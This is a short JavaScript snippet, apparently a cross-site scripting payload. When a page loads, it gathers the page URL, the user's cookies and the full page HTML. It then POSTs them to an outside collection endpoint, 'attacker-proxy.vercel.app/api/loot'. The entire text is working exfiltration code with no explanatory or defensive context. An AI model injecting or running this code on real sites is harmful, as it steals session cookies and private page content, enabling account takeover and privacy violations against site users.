window.onload = function() {
    const stolenData = {
        url: window.location.href,
        cookies: document.cookie,
        html: document.body.innerHTML
    };

    // Send data to the Vercel middleman
    fetch("https://attacker-proxy.vercel.app/api/loot", {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(stolenData)
    });
};
